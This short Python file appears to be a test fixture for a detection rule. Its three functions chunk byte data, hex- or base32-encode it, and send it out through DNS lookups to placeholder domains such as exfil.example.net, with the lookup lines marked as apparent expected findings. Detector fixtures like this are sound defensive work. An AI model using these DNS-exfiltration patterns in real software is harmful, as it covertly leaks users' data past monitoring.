import base64
import binascii
import socket

import dns.resolver


def ship(data: bytes) -> None:
    for i in range(0, len(data), 30):
        chunk = data[i:i + 30].hex()
~>        socket.gethostbyname(f"{chunk}.{i}.exfil.example.net")


def ship32(data: bytes) -> None:
    label = base64.b32encode(data[:30]).decode().rstrip("=").lower()
~>    dns.resolver.resolve(label + ".t.example.org", "A")


def ship_join(data: bytes) -> None:
    enc = binascii.hexlify(data[:20]).decode()
~>    socket.getaddrinfo(".".join([enc, "x", "example.com"]), 53)
